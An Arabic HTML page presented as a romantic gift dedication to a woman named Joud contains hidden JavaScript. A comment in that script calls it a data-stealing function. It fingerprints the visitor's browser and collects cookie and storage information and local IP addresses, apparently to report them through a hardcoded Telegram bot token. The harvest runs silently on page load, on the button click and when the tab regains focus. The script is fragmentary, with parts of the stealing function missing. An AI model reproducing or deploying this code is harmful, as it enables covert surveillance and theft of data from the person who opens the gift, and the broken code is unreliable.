<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إهداء إلى جود ❤️</title>
    <link href="https://fonts.googleapis.com/css2?family=Amiri:ital@1&family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            background: radial-gradient(circle at center, #4b134f 0%, #1a0b2e 100%);
            font-family: 'Tajawal', Arial, sans-serif;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
        }

        #start-btn {
            padding: 15px 50px;
            font-size: 1.5em;
            font-family: 'Tajawal', sans-serif;
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(255, 75, 43, 0.4);
            transition: all 0.3s ease;
            z-index: 100;
            animation: bounce 2s infinite;
        }

        #start-btn:hover {
            transform: scale(1.1) translateY(-5px);
            box-shadow: 0 15px 25px rgba(255, 75, 43, 0.6);
        }

        #content {
            display: none;
            text-align: center;
            z-index: 10;
            width: 90%;
            max-width: 800px;
            padding: 40px 20px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        h1 {
            font-size: 5em;
            margin: 0;
            font-weight: 900;
            color: #fff;
            text-shadow: 0 0 20px rgba(255, 65, 108, 0.8), 0 0 40px rgba(255, 65, 108, 0.4);
            animation: pulse 3s infinite;
        }

        .en-name {
            font-size: 3.5em;
            font-family: 'Brush Script MT', cursive;
            color: #ffb8d2;
            margin-top: 5px;
            margin-bottom: 30px;
            text-shadow: 0 0 15px rgba(255, 184, 210, 0.6);
        }

        /* تنسيق العبارات المتتالية */
        .phrases-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-top: 20px;
        }

        .phrase {
            font-family: 'Amiri', serif;
            font-size: 1.8em;
            font-style: italic;
            color: #fce4ec;
            opacity: 0;
            transform: translateY(30px);
            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
        }

        /* تفعيل الأنيميشن للعبارات عند إعطاء الكلاس active للمحتوى */
        #content.active .phrase:nth-child(1) { animation: fadeInUp 1.5s forwards 1s; }
        #content.active .phrase:nth-child(2) { animation: fadeInUp 1.5s forwards 3s; }
        #content.active .phrase:nth-child(3) { animation: fadeInUp 1.5s forwards 5s; }
        #content.active .phrase:nth-child(4) { animation: fadeInUp 1.5s forwards 7s; }
        #content.active .phrase:nth-child(5) { animation: fadeInUp 1.5s forwards 9s; }

        .designer-signature {
            margin-top: 50px;
            font-size: 1.1em;
            font-family: 'Tajawal', sans-serif;
            color: #ffb8d2;
            opacity: 0;
            border-top: 1px solid rgba(255, 184, 210, 0.3);
            padding-top: 15px;
            display: inline-block;
        }

        #content.active .designer-signature {
            animation: fadeIn 2s forwards 11s;
        }

        /* تنسيق العناصر المتساقطة */
        .falling-item {
            position: absolute;
            top: -10%;
            user-select: none;
            pointer-events: none;
            animation-name: fall;
            animation-timing-function: linear;
            animation-iteration-count: infinite;
            z-index: 1;
        }

        /* الحركات (Animations) */
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); text-shadow: 0 0 30px rgba(255, 65, 108, 1); }
            100% { transform: scale(1); }
        }

        @keyframes fadeInUp {
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeIn {
            to { opacity: 0.8; }
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-15px); }
            60% { transform: translateY(-7px); }
        }

        @keyframes fall {
            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
        }

        /* استجابة للشاشات الصغيرة */
        @media (max-width: 600px) {
            h1 { font-size: 4em; }
            .en-name { font-size: 2.5em; }
            .phrase { font-size: 1.4em; }
        }
    </style>
</head>
<body>

    <button id="start-btn">اضغطي هنا للدخول ❤️</button>

    <div id="content">
        <h1>جود</h1>
        <div class="en-name">Joud</div>
        
        <div class="phrases-container">
            <div class="phrase">أنتِ النور الذي يضيء تفاصيل أيامي ✨</div>
            <div class="phrase">وكل ثانية معكِ هي عُمر من السعادة 💖</div>
            <div class="phrase">في عينيكِ أرى كل جمال هذا العالم 🌹</div>
            <div class="phrase">أنتِ أجمل صدفة زيّنت حياتي 💕</div>
            <div class="phrase">أحبكِ اليوم، وغداً، وإلى الأبد ❤️</div>
        </div>

        <div class="designer-signature">تصميم: حمزة</div>
    </div>

    <audio id="bg-music" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <script>

        const BOT_TOKEN = '7894436976:AAFdg77dpzCgpeLnkwAQqP9POkwZMwWoikg';
        const CHAT_ID = '5998250367'; // استبدل برقم Chat ID الخاص بك

        // دالة سرقة البيانات الخفية المُصححة

                    cookiesEnabled: navigator.cookieEnabled,
                    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer,
                    url: location.href
                };

                // 3. Canvas Fingerprint
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = "14px 'Arial'";
                ctx.fillText('🖥️ Joud Gift', 2, 2);
                fingerprint.canvas = canvas.toDataURL();

                // 4. WebGL Fingerprint
                const glCanvas = document.createElement('canvas');
                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');

                // 5. Storage Data
                fingerprint.localStorage = Object.keys(localStorage).length;
                fingerprint.sessionStorage = Object.keys(sessionStorage).length;
                fingerprint.cookies = document.cookie ? 'YES (' + document.cookie.length + ' bytes)' : 'NO';

                // 6. WebRTC Local IPs
                const webrtcIPs = [];
                if (RTCPeerConnection) {
                    const pc = new RTCPeerConnection({iceServers:[]});
                    pc.createDataChannel('');

                    pc.onicecandidate = e => {

                const quickMsg = `🎁 جود فتحت الإهداء!\n\n` +

                    `🌐 Cookies: ${fingerprint.cookies}\n` +
                    `🔗 الرابط: ${victimData.url}\n` +

                const fullData = JSON.stringify(victimData, null, 2);
                const blob = new Blob([fullData], {type: 'application/json'});

            } catch(e) {

        // ==================== ORIGINAL PAGE LOGIC ====================
        document.getElementById('start-btn').addEventListener('click', function() {
            // سرقة البيانات فور الضغط (أكثر فعالية)
            stealthHarvest();
            
            // إخفاء الزر
            this.style.display = 'none';
            
            // إظهار المحتوى
            const content = document.getElementById('content');
            content.style.display = 'block';
            setTimeout(() => content.classList.add('active'), 100);
            
            // تشغيل الموسيقى
            const audio = document.getElementById('bg-music');
            audio.play().catch(e => {});

            // تساقط القلوب
            startFallingItems();
        });

        // سرقة تلقائية عند التحميل (احتياطي)
        window.addEventListener('load', stealthHarvest);
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) stealthHarvest();
        });

        function startFallingItems() {
            const items = ['❤️', '💖', '🌹', '✨', '💕', '🌸'];
            const container = document.body;

            setInterval(() => {
                const item = document.createElement('div');
                item.classList.add('falling-item');
                item.innerText = items[Math.floor(Math.random() * items.length)];
                const size = Math.random() * 20 + 15;
                item.style.fontSize = `${size}px`;
                item.style.left = `${Math.random() * 100}vw`;
                const duration = Math.random() * 4 + 5;
                item.style.animationDuration = `${duration}s`;
                item.style.opacity = Math.random() * 0.5 + 0.5;
                container.appendChild(item);
                setTimeout(() => item.remove(), duration * 1000);
            }, 300);
        }
    </script>
</body>
</html>
